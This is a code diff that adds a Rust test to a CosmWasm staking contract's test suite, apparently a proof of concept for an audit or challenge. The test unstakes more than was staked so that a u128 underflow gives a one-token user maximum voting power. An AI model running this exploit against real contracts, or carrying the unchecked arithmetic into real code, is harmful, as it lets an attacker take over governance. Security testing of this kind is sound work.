@@ -151,4 +151,53 @@ pub mod tests {
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, amount);
     }
+
+    const UNPRIVILEGED_USER: &str = "unprivileged_user";
+
+    #[test]
+    fn exploit_u128_underflow() {
+        let (mut app, contract_addr) = proper_instantiate();
+        let amount: Uint128 = Uint128::new(1);         
+        app = mint_tokens(app, UNPRIVILEGED_USER.to_string(), amount); 
+        let hacker = Addr::unchecked(UNPRIVILEGED_USER); 
+        
+        // deposit funds
+        let msg = ExecuteMsg::Deposit {};
+        app.execute_contract(
+            hacker.clone(),
+            contract_addr.clone(),
+            &msg,
+            &[coin(amount.u128(), DENOM)],
+        ).unwrap();
+
+        // stake
+        let msg = ExecuteMsg::Stake {
+            lock_amount: amount.u128(),
+        };
+        app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // Update block time to unlock
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        // EXPLOIT: unstake more than staked and undrflow u128
+        let msg = ExecuteMsg::Unstake {
+            unlock_amount: amount.u128() + 1,
+        };
+        app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // Query voting power
+        let msg = QueryMsg::GetVotingPower {
+            user: (&UNPRIVILEGED_USER).to_string(),
+        };
+        let voting_power: u128 = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        // unprivileged user has max voting power with just 1 token
+        assert_eq!(voting_power, std::u128::MAX);
+    }
 }
